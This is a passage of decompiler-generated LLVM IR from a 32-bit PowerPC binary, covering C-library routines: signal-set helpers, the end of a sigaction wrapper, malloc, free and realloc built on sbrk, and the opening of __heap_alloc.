  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ae7422 = add i32 %v2_1000ae64, 128
  %v3_1000ae7423 = inttoptr i32 %v2_1000ae7422 to i32*
  store i32 0, i32* %v3_1000ae7423, align 4
  %v0_1000ae7824 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ae7825 = add i32 %v0_1000ae7824, -1
  store i32 %v1_1000ae7825, i32* %r11.global-to-local, align 4
  %v1_1000ae7c26 = mul i32 %v1_1000ae7825, 4
  %v1_1000ae8027 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ae8028 = add i32 %v1_1000ae8027, %v1_1000ae7c26
  store i32 %v2_1000ae8028, i32* %r9.global-to-local, align 4
  %v0_1000ae8429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ae8430 = add i32 %v0_1000ae8429, -1
  store i32 %v1_1000ae8430, i32* %ctr.global-to-local, align 4
  %v2_1000ae8431 = icmp eq i32 %v1_1000ae8430, 0
  br i1 %v2_1000ae8431, label %dec_label_pc_1000ae88, label %dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge

dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge: ; preds = %dec_label_pc_1000ae74.lr.ph, %dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge
  %v2_1000ae8032 = phi i32 [ %v2_1000ae80, %dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge ], [ %v2_1000ae8028, %dec_label_pc_1000ae74.lr.ph ]
  %v0_1000ae74.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ae74 = add i32 %v2_1000ae8032, 4
  %v3_1000ae74 = inttoptr i32 %v2_1000ae74 to i32*
  store i32 %v0_1000ae74.pre, i32* %v3_1000ae74, align 4
  %v0_1000ae78 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ae78 = add i32 %v0_1000ae78, -1
  store i32 %v1_1000ae78, i32* %r11.global-to-local, align 4
  %v1_1000ae7c = mul i32 %v1_1000ae78, 4
  %v1_1000ae80 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ae80 = add i32 %v1_1000ae80, %v1_1000ae7c
  store i32 %v2_1000ae80, i32* %r9.global-to-local, align 4
  %v0_1000ae84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ae84 = add i32 %v0_1000ae84, -1
  store i32 %v1_1000ae84, i32* %ctr.global-to-local, align 4
  %v2_1000ae84 = icmp eq i32 %v1_1000ae84, 0
  br i1 %v2_1000ae84, label %dec_label_pc_1000ae88, label %dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge

dec_label_pc_1000ae88:                            ; preds = %dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge, %dec_label_pc_1000ae74.lr.ph
  %v0_1000ae8c.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ae88 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000ae88, i32* @r3, align 4
  store i32 %v0_1000ae8c.pre, i32* @r4, align 4
  %v0_1000ae90 = call i32 @__sigaddset()
  %v1_1000ae94 = icmp slt i32 %v0_1000ae90, 0
  br i1 %v1_1000ae94, label %dec_label_pc_1000aedc, label %dec_label_pc_1000ae9c

dec_label_pc_1000ae9c:                            ; preds = %dec_label_pc_1000ae88
  %v0_1000aea0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aea8 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1002ace8.612 to i32), i32 %v0_1000aea0)
  %v2_1000aeb4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268480204, i32* @lr, align 4
  %v4_1000aec8 = call i32 @__libc_sigaction(i32 %v0_1000aea0, i32* nonnull %stack_var_-296, i32 %v2_1000aeb4)
  %v1_1000aecc = icmp slt i32 %v4_1000aec8, 0
  br i1 %v1_1000aecc, label %dec_label_pc_1000aedc, label %dec_label_pc_1000aed4

dec_label_pc_1000aed4:                            ; preds = %dec_label_pc_1000ae9c
  %v3_1000aed4 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000aed4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aee0

dec_label_pc_1000aedc:                            ; preds = %dec_label_pc_1000ae9c, %dec_label_pc_1000ae88
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aee0

dec_label_pc_1000aee0:                            ; preds = %dec_label_pc_1000aed4, %dec_label_pc_1000ae44, %dec_label_pc_1000aedc
  %v0_1000aee4 = phi i32 [ %v3_1000aed4, %dec_label_pc_1000aed4 ], [ %v0_1000aee4.pre, %dec_label_pc_1000ae44 ], [ -1, %dec_label_pc_1000aedc ]
  ret i32 %v0_1000aee4

; uselistorder directives
  uselistorder i32 %v1_1000ae84, { 1, 0 }
  uselistorder i32 %v2_1000ae80, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000aee0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ae74.dec_label_pc_1000ae74_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000aef8 = add i32 %arg2, -1
  %v1_1000aefc = call i32 @__asm_rlwinm(i32 %v1_1000aef8, i32 29, i32 3, i32 29)
  %v1_1000af00 = urem i32 %v1_1000aef8, 32
  %v2_1000af04 = add i32 %v1_1000aefc, %arg1
  %v3_1000af04 = inttoptr i32 %v2_1000af04 to i32*
  %v4_1000af04 = load i32, i32* %v3_1000af04, align 4
  %v3_1000af0c = shl i32 1, %v1_1000af00
  %v2_1000af10 = and i32 %v4_1000af04, %v3_1000af0c
  %v2_1000af14 = icmp ne i32 %v2_1000af10, 0
  %v5_1000af18 = zext i1 %v2_1000af14 to i32
  ret i32 %v5_1000af18
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000af20 = load i32, i32* @r4, align 4
  %v1_1000af20 = add i32 %v0_1000af20, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000af28 = call i32 @__asm_rlwinm(i32 %v1_1000af20, i32 29, i32 3, i32 29)
  %v1_1000af2c = urem i32 %v1_1000af20, 32
  %v1_1000af30 = load i32, i32* @r3, align 4
  %v2_1000af30 = add i32 %v1_1000af30, %v1_1000af28
  %v3_1000af30 = inttoptr i32 %v2_1000af30 to i32*
  %v4_1000af30 = load i32, i32* %v3_1000af30, align 4
  %v0_1000af34 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000af34 = shl i32 %v0_1000af34, %v1_1000af2c
  store i32 %v3_1000af34, i32* %r0.global-to-local, align 4
  %v2_1000af38 = or i32 %v3_1000af34, %v4_1000af30
  store i32 %v2_1000af38, i32* %v3_1000af30, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000af48 = add i32 %arg2, -1
  %v1_1000af50 = call i32 @__asm_rlwinm(i32 %v1_1000af48, i32 29, i32 3, i32 29)
  %v1_1000af54 = urem i32 %v1_1000af48, 32
  %v2_1000af58 = add i32 %v1_1000af50, %arg1
  %v3_1000af58 = inttoptr i32 %v2_1000af58 to i32*
  %v4_1000af58 = load i32, i32* %v3_1000af58, align 4
  %v3_1000af5c = shl i32 -2, %v1_1000af54
  %v4_1000af5c = sub nsw i32 32, %v1_1000af54
  %v5_1000af5c = lshr i32 -2, %v4_1000af5c
  %v6_1000af5c = or i32 %v5_1000af5c, %v3_1000af5c
  %v2_1000af60 = and i32 %v6_1000af5c, %v4_1000af58
  store i32 %v2_1000af60, i32* %v3_1000af58, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000af70 = load i32, i32* @r3, align 4
  %v3_1000af70 = icmp eq i32 %v0_1000af70, 0
  br i1 %v3_1000af70, label %dec_label_pc_1000af88, label %dec_label_pc_1000af8c

dec_label_pc_1000af88:                            ; preds = %entry
  br label %dec_label_pc_1000af8c

dec_label_pc_1000af8c:                            ; preds = %entry, %dec_label_pc_1000af88
  %v0_1000af9c = phi i32 [ 1, %dec_label_pc_1000af88 ], [ %v0_1000af70, %entry ]
  %v3_1000af90 = icmp ugt i32 %v0_1000af9c, -8
  br i1 %v3_1000af90, label %dec_label_pc_1000b0a0, label %dec_label_pc_1000af98

dec_label_pc_1000af98:                            ; preds = %dec_label_pc_1000af8c
  %v1_1000af9c = add i32 %v0_1000af9c, 4
  store i32 ptrtoint (i32* @global_var_1002acb8.613 to i32), i32* @r29, align 4
  store i32 %v1_1000af9c, i32* %stack_var_-40, align 4
  %v0_1000afac = call i32 @__pthread_return_0()
  %v2_1000afb4 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000afbc = call i32 @__heap_alloc(i32* inttoptr (i32 268585496 to i32*), i32 %v2_1000afb4)
  store i32 %v3_1000afbc, i32* %r31.global-to-local, align 4
  %v0_1000afc8 = call i32 @__pthread_return_0()
  %v3_1000afcc = icmp eq i32 %v3_1000afbc, 0
  br i1 %v3_1000afcc, label %dec_label_pc_1000afd4, label %dec_label_pc_1000b084.thread

dec_label_pc_1000b084.thread:                     ; preds = %dec_label_pc_1000af98
  br label %dec_label_pc_1000b098

dec_label_pc_1000afd4:                            ; preds = %dec_label_pc_1000af98
  %v3_1000afd8 = load i32, i32* @global_var_10024a78.554, align 4
  store i32 %v3_1000afd8, i32* %r31.global-to-local, align 4
  %v3_1000afdc = load i32, i32* %stack_var_-40, align 4
  %v2_1000afe0 = icmp ult i32 %v3_1000afdc, %v3_1000afd8
  br i1 %v2_1000afe0, label %dec_label_pc_1000aff8, label %dec_label_pc_1000afe8

dec_label_pc_1000afe8:                            ; preds = %dec_label_pc_1000afd4
  %v1_1000afec = sub i32 0, %v3_1000afd8
  %v2_1000afe8 = add i32 %v3_1000afd8, -1
  %v1_1000aff0 = add i32 %v2_1000afe8, %v3_1000afdc
  %v2_1000aff4 = and i32 %v1_1000aff0, %v1_1000afec
  store i32 %v2_1000aff4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000aff8

dec_label_pc_1000aff8:                            ; preds = %dec_label_pc_1000afd4, %dec_label_pc_1000afe8
  %v0_1000b004 = call i32 @__pthread_return_0()
  %v0_1000b008 = load i32, i32* %r31.global-to-local, align 4
  store i32 268480528, i32* @lr, align 4
  %v1_1000b00c = call i32 @__GI_sbrk(i32 %v0_1000b008)
  %v3_1000b010 = icmp eq i32 %v1_1000b00c, -1
  br i1 %v3_1000b010, label %dec_label_pc_1000b030, label %dec_label_pc_1000b018

dec_label_pc_1000b018:                            ; preds = %dec_label_pc_1000aff8
  %v1_1000b018 = add i32 %v1_1000b00c, 3
  %v1_1000b01c = call i32 @__asm_rlwinm(i32 %v1_1000b018, i32 0, i32 0, i32 29)
  store i32 %v1_1000b01c, i32* @r30, align 4
  %v4_1000b020 = icmp eq i32 %v1_1000b01c, %v1_1000b00c
  br i1 %v4_1000b020, label %dec_label_pc_1000b030, label %dec_label_pc_1000b028

dec_label_pc_1000b028:                            ; preds = %dec_label_pc_1000b018
  %v2_1000b028 = sub i32 %v1_1000b01c, %v1_1000b00c
  store i32 268480560, i32* @lr, align 4
  %v1_1000b02c = call i32 @__GI_sbrk(i32 %v2_1000b028)
  br label %dec_label_pc_1000b030

dec_label_pc_1000b030:                            ; preds = %dec_label_pc_1000b018, %dec_label_pc_1000aff8, %dec_label_pc_1000b028
  %v0_1000b038 = call i32 @__pthread_return_0()
  %v0_1000b03c = load i32, i32* @r30, align 4
  %v3_1000b03c = icmp eq i32 %v0_1000b03c, -1
  br i1 %v3_1000b03c, label %dec_label_pc_1000b0a0, label %dec_label_pc_1000b084

dec_label_pc_1000b084:                            ; preds = %dec_label_pc_1000b030
  store i32 ptrtoint (i32* @global_var_1002acb8.613 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10024a18 to i32), i32* @r29, align 4
  %v0_1000b058 = call i32 @__pthread_return_0()
  %v0_1000b05c = load i32, i32* @r31, align 4
  %v0_1000b060 = load i32, i32* @r30, align 4
  %v0_1000b064 = load i32, i32* @r29, align 4
  store i32 268480620, i32* @lr, align 4
  %v3_1000b068 = inttoptr i32 %v0_1000b064 to i32*
  %v4_1000b068 = call i32 @__heap_free(i32* %v3_1000b068, i32 %v0_1000b060, i32 %v0_1000b05c)
  %v0_1000b06c = load i32, i32* @r29, align 4
  %v2_1000b074 = inttoptr i32 %v0_1000b06c to i32*
  %v3_1000b074 = call i32 @__heap_alloc(i32* %v2_1000b074, i32 %v2_1000afb4)
  store i32 %v3_1000b074, i32* %r31.global-to-local, align 4
  %v0_1000b080 = call i32 @__pthread_return_0()
  %v3_1000b084 = icmp eq i32 %v3_1000b074, 0
  br i1 %v3_1000b084, label %dec_label_pc_1000b098.thread, label %dec_label_pc_1000b098

dec_label_pc_1000b098.thread:                     ; preds = %dec_label_pc_1000b084
  br label %dec_label_pc_1000b0a0

dec_label_pc_1000b098:                            ; preds = %dec_label_pc_1000b084, %dec_label_pc_1000b084.thread
  %v0_1000b098.pr6 = phi i32 [ %v3_1000afbc, %dec_label_pc_1000b084.thread ], [ %v3_1000b074, %dec_label_pc_1000b084 ]
  %v3_1000b08c = load i32, i32* %stack_var_-40, align 4
  %v2_1000b090 = inttoptr i32 %v0_1000b098.pr6 to i32*
  store i32 %v3_1000b08c, i32* %v2_1000b090, align 4
  %v0_1000b094 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b094 = add i32 %v0_1000b094, 4
  store i32 %v1_1000b094, i32* @r31, align 4
  %v3_1000b098 = icmp eq i32 %v1_1000b094, 0
  br i1 %v3_1000b098, label %dec_label_pc_1000b0a0, label %dec_label_pc_1000b0b0

dec_label_pc_1000b0a0:                            ; preds = %dec_label_pc_1000b098.thread, %dec_label_pc_1000b098, %dec_label_pc_1000b030, %dec_label_pc_1000af8c
  %v0_1000b0a0 = call i32 @__errno_location()
  %v2_1000b0a8 = inttoptr i32 %v0_1000b0a0 to i32*
  store i32 12, i32* %v2_1000b0a8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000b0b0

dec_label_pc_1000b0b0:                            ; preds = %dec_label_pc_1000b098, %dec_label_pc_1000b0a0
  %v0_1000b0b4 = phi i32 [ %v1_1000b094, %dec_label_pc_1000b098 ], [ 0, %dec_label_pc_1000b0a0 ]
  ret i32 %v0_1000b0b4

; uselistorder directives
  uselistorder i32 %v1_1000b094, { 1, 0, 2 }
  uselistorder i32 %v1_1000b01c, { 1, 0, 2 }
  uselistorder i32 %v1_1000b00c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000afd8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000afbc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000b0b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0a0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000b030, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000aff8, { 1, 0 }
  uselistorder label %dec_label_pc_1000af8c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000b0c8 = load i32, i32* @r3, align 4
  %v3_1000b0c8 = icmp eq i32 %v0_1000b0c8, 0
  br i1 %v3_1000b0c8, label %dec_label_pc_1000b1b4, label %dec_label_pc_1000b0e0

dec_label_pc_1000b0e0:                            ; preds = %entry
  %v1_1000b0e4 = add i32 %v0_1000b0c8, -4
  %v2_1000b0e4 = inttoptr i32 %v1_1000b0e4 to i32*
  %v3_1000b0e4 = load i32, i32* %v2_1000b0e4, align 4
  store i32 %v3_1000b0e4, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_1000b0f8 = call i32 @__pthread_return_0()
  %v0_1000b100 = load i32, i32* @r28, align 4
  store i32 268480780, i32* @lr, align 4
  %v4_1000b108 = call i32 @__heap_free(i32* nonnull @global_var_10024a18, i32 %v1_1000b0e4, i32 %v0_1000b100)
  %v3_1000b110 = load i32, i32* @global_var_10024a78.554, align 4
  store i32 %v4_1000b108, i32* @r29, align 4
  %v1_1000b118 = inttoptr i32 %v4_1000b108 to i32*
  %v2_1000b118 = load i32, i32* %v1_1000b118, align 4
  store i32 %v2_1000b118, i32* @r27, align 4
  %v1_1000b11c = mul i32 %v3_1000b110, 8
  %v2_1000b120 = icmp ult i32 %v2_1000b118, %v1_1000b11c
  br i1 %v2_1000b120, label %dec_label_pc_1000b154, label %dec_label_pc_1000b128

dec_label_pc_1000b128:                            ; preds = %dec_label_pc_1000b0e0
  store i32 ptrtoint (i32* @global_var_1002ad68.616 to i32), i32* @r28, align 4
  %v0_1000b138 = call i32 @__pthread_return_0()
  store i32 268480836, i32* @lr, align 4
  %v1_1000b140 = call i32 @__GI_sbrk(i32 0)
  %v0_1000b144 = load i32, i32* @r31, align 4
  %v4_1000b144 = icmp eq i32 %v0_1000b144, %v1_1000b140
  br i1 %v4_1000b144, label %dec_label_pc_1000b15c, label %dec_label_pc_1000b14c

dec_label_pc_1000b14c:                            ; preds = %dec_label_pc_1000b128
  %v0_1000b150 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000b154

dec_label_pc_1000b154:                            ; preds = %dec_label_pc_1000b0e0, %dec_label_pc_1000b14c
  br label %dec_label_pc_1000b1b0

dec_label_pc_1000b15c:                            ; preds = %dec_label_pc_1000b128
  %v0_1000b15c = load i32, i32* @r29, align 4
  %v1_1000b15c = add i32 %v0_1000b15c, 4
  %v2_1000b15c = inttoptr i32 %v1_1000b15c to i32*
  %v3_1000b15c = load i32, i32* %v2_1000b15c, align 4
  %v3_1000b160 = icmp eq i32 %v3_1000b15c, 0
  br i1 %v3_1000b160, label %dec_label_pc_1000b170, label %dec_label_pc_1000b168

dec_label_pc_1000b168:                            ; preds = %dec_label_pc_1000b15c
  %v1_1000b168 = add i32 %v0_1000b15c, 8
  %v2_1000b168 = inttoptr i32 %v1_1000b168 to i32*
  %v3_1000b168 = load i32, i32* %v2_1000b168, align 4
  %v2_1000b16c = add i32 %v3_1000b15c, 8
  %v3_1000b16c = inttoptr i32 %v2_1000b16c to i32*
  store i32 %v3_1000b168, i32* %v3_1000b16c, align 4
  %v0_1000b170.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b170

dec_label_pc_1000b170:                            ; preds = %dec_label_pc_1000b15c, %dec_label_pc_1000b168
  %v0_1000b170 = phi i32 [ %v0_1000b15c, %dec_label_pc_1000b15c ], [ %v0_1000b170.pre, %dec_label_pc_1000b168 ]
  %v1_1000b170 = add i32 %v0_1000b170, 8
  %v2_1000b170 = inttoptr i32 %v1_1000b170 to i32*
  %v3_1000b170 = load i32, i32* %v2_1000b170, align 4
  %v1_1000b174 = add i32 %v0_1000b170, 4
  %v2_1000b174 = inttoptr i32 %v1_1000b174 to i32*
  %v3_1000b174 = load i32, i32* %v2_1000b174, align 4
  %v3_1000b178 = icmp eq i32 %v3_1000b170, 0
  br i1 %v3_1000b178, label %dec_label_pc_1000b188, label %dec_label_pc_1000b180

dec_label_pc_1000b180:                            ; preds = %dec_label_pc_1000b170
  %v2_1000b180 = add i32 %v3_1000b170, 4
  %v3_1000b180 = inttoptr i32 %v2_1000b180 to i32*
  store i32 %v3_1000b174, i32* %v3_1000b180, align 4
  br label %dec_label_pc_1000b18c

dec_label_pc_1000b188:                            ; preds = %dec_label_pc_1000b170
  store i32 %v3_1000b174, i32* @global_var_10024a18, align 4
  br label %dec_label_pc_1000b18c

dec_label_pc_1000b18c:                            ; preds = %dec_label_pc_1000b180, %dec_label_pc_1000b188
  %v0_1000b194 = call i32 @__pthread_return_0()
  %v0_1000b198 = load i32, i32* @r27, align 4
  %v1_1000b198 = load i32, i32* @r29, align 4
  %v0_1000b1a0 = load i32, i32* @r31, align 4
  %v2_1000b198 = sub i32 12, %v0_1000b198
  %v1_1000b19c = add i32 %v2_1000b198, %v1_1000b198
  %v2_1000b1a0 = sub i32 %v1_1000b19c, %v0_1000b1a0
  store i32 268480936, i32* @lr, align 4
  %v1_1000b1a4 = call i32 @__GI_sbrk(i32 %v2_1000b1a0)
  br label %dec_label_pc_1000b1b0

dec_label_pc_1000b1b0:                            ; preds = %dec_label_pc_1000b154, %dec_label_pc_1000b18c
  %v0_1000b1b0 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000b1b4

dec_label_pc_1000b1b4:                            ; preds = %entry, %dec_label_pc_1000b1b0
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000b1b0, %dec_label_pc_1000b1b0 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000b170, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b18c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b170, { 1, 0 }
  uselistorder label %dec_label_pc_1000b154, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000b1c8 = load i32, i32* @r4, align 4
  %v3_1000b1c8 = icmp eq i32 %v0_1000b1c8, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000b1c8, label %dec_label_pc_1000b1e4, label %dec_label_pc_1000b1f0

dec_label_pc_1000b1e4:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000b1e8.619 to i32), i32* @lr, align 4
  %v0_1000b1e4 = call i32 @free()
  br label %dec_label_pc_1000b1fc

dec_label_pc_1000b1f0:                            ; preds = %entry
  %v3_1000b1f0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000b1f0, label %dec_label_pc_1000b1fc, label %dec_label_pc_1000b208

dec_label_pc_1000b1fc:                            ; preds = %dec_label_pc_1000b1f0, %dec_label_pc_1000b1e4
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b1e4 ], [ %v0_1000b1c8, %dec_label_pc_1000b1f0 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268481024, i32* @lr, align 4
  %v0_1000b1fc = call i32 @malloc()
  store i32 %v0_1000b1fc, i32* @r28, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b208:                            ; preds = %dec_label_pc_1000b1f0
  %v1_1000b208 = add i32 %v0_1000b1c8, 7
  %v1_1000b20c = add i32 %arg1, -4
  store i32 %v1_1000b20c, i32* %r27.global-to-local, align 4
  %v1_1000b210 = call i32 @__asm_rlwinm(i32 %v1_1000b208, i32 0, i32 0, i32 29)
  store i32 %v1_1000b210, i32* %r31.global-to-local, align 4
  %v2_1000b214 = inttoptr i32 %v1_1000b20c to i32*
  %v3_1000b214 = load i32, i32* %v2_1000b214, align 4
  store i32 %v3_1000b214, i32* @r30, align 4
  %v2_1000b218 = icmp ugt i32 %v1_1000b210, 11
  br i1 %v2_1000b218, label %dec_label_pc_1000b224, label %dec_label_pc_1000b220

dec_label_pc_1000b220:                            ; preds = %dec_label_pc_1000b208
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b224

dec_label_pc_1000b224:                            ; preds = %dec_label_pc_1000b208, %dec_label_pc_1000b220
  %v0_1000b2a4 = phi i32 [ %v1_1000b210, %dec_label_pc_1000b208 ], [ 12, %dec_label_pc_1000b220 ]
  %v3_1000b224 = icmp ugt i32 %v0_1000b2a4, %v3_1000b214
  br i1 %v3_1000b224, label %dec_label_pc_1000b22c, label %dec_label_pc_1000b2a4

dec_label_pc_1000b22c:                            ; preds = %dec_label_pc_1000b224
  store i32 ptrtoint (i32* @global_var_1002acb8.613 to i32), i32* @r29, align 4
  %v0_1000b238 = call i32 @__pthread_return_0()
  %v0_1000b240 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000b240 = load i32, i32* @r30, align 4
  %v2_1000b240 = add i32 %v1_1000b240, %v0_1000b240
  %v1_1000b244 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b244 = sub i32 %v1_1000b244, %v1_1000b240
  %v4_1000b24c = call i32 @__heap_alloc_at(i32* nonnull @global_var_10024a18, i32 %v2_1000b240, i32 %v2_1000b244)
  store i32 %v4_1000b24c, i32* %r27.global-to-local, align 4
  %v0_1000b258 = call i32 @__pthread_return_0()
  %v3_1000b25c = icmp eq i32 %v4_1000b24c, 0
  br i1 %v3_1000b25c, label %dec_label_pc_1000b270, label %dec_label_pc_1000b264

dec_label_pc_1000b264:                            ; preds = %dec_label_pc_1000b22c
  %v0_1000b264 = load i32, i32* @r30, align 4
  %v2_1000b264 = add i32 %v0_1000b264, %v4_1000b24c
  %v1_1000b268 = load i32, i32* @r28, align 4
  %v2_1000b268 = add i32 %v1_1000b268, -4
  %v3_1000b268 = inttoptr i32 %v2_1000b268 to i32*
  store i32 %v2_1000b264, i32* %v3_1000b268, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b270:                            ; preds = %dec_label_pc_1000b22c
  %v0_1000b270 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b270 = add i32 %v0_1000b270, -4
  store i32 %v1_1000b270, i32* @r3, align 4
  store i32 268481144, i32* @lr, align 4
  %v0_1000b274 = call i32 @malloc()
  store i32 %v0_1000b274, i32* @r3, align 4
  store i32 %v0_1000b274, i32* @r31, align 4
  %v3_1000b278 = icmp eq i32 %v0_1000b274, 0
  br i1 %v3_1000b278, label %dec_label_pc_1000b280, label %dec_label_pc_1000b288

dec_label_pc_1000b280:                            ; preds = %dec_label_pc_1000b270
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b288:                            ; preds = %dec_label_pc_1000b270
  %v0_1000b288 = load i32, i32* @r28, align 4
  store i32 %v0_1000b288, i32* @r4, align 4
  %v0_1000b28c = load i32, i32* @r30, align 4
  %v1_1000b28c = add i32 %v0_1000b28c, -4
  store i32 %v1_1000b28c, i32* @r5, align 4
  store i32 268481172, i32* @lr, align 4
  %v0_1000b290 = call i32 @memcpy()
  %v0_1000b294 = load i32, i32* @r28, align 4
  store i32 %v0_1000b294, i32* @r3, align 4
  store i32 268481180, i32* @lr, align 4
  %v0_1000b298 = call i32 @free()
  %v0_1000b29c = load i32, i32* @r31, align 4
  store i32 %v0_1000b29c, i32* @r28, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b2a4:                            ; preds = %dec_label_pc_1000b224
  %v1_1000b2a4 = add i32 %v0_1000b2a4, 28
  %v3_1000b2a8 = icmp ugt i32 %v1_1000b2a4, %v3_1000b214
  br i1 %v3_1000b2a8, label %dec_label_pc_1000b2e0, label %dec_label_pc_1000b2b0

dec_label_pc_1000b2b0:                            ; preds = %dec_label_pc_1000b2a4
  store i32 ptrtoint (i32* @global_var_1002acb8.613 to i32), i32* @r29, align 4
  %v0_1000b2bc = call i32 @__pthread_return_0()
  %v0_1000b2c4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000b2c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b2c4 = add i32 %v1_1000b2c4, %v0_1000b2c4
  %v1_1000b2c8 = load i32, i32* @r30, align 4
  %v2_1000b2c8 = sub i32 %v1_1000b2c8, %v1_1000b2c4
  store i32 268481236, i32* @lr, align 4
  %v4_1000b2d0 = call i32 @__heap_free(i32* nonnull @global_var_10024a18, i32 %v2_1000b2c4, i32 %v2_1000b2c8)
  %v0_1000b2d8 = call i32 @__pthread_return_0()
  %v0_1000b2dc = load i32, i32* @r31, align 4
  %v1_1000b2dc = load i32, i32* @r28, align 4
  %v2_1000b2dc = add i32 %v1_1000b2dc, -4
  %v3_1000b2dc = inttoptr i32 %v2_1000b2dc to i32*
  store i32 %v0_1000b2dc, i32* %v3_1000b2dc, align 4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b2e0:                            ; preds = %dec_label_pc_1000b2a4, %dec_label_pc_1000b288, %dec_label_pc_1000b280, %dec_label_pc_1000b264, %dec_label_pc_1000b1fc, %dec_label_pc_1000b2b0
  %v0_1000b2e4 = load i32, i32* @r28, align 4
  ret i32 %v0_1000b2e4

; uselistorder directives
  uselistorder i32 %v1_1000b2c4, { 1, 0 }
  uselistorder i32 %v4_1000b24c, { 1, 0, 2 }
  uselistorder i32 %v1_1000b240, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_10024a18, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000b2e0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000b224, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
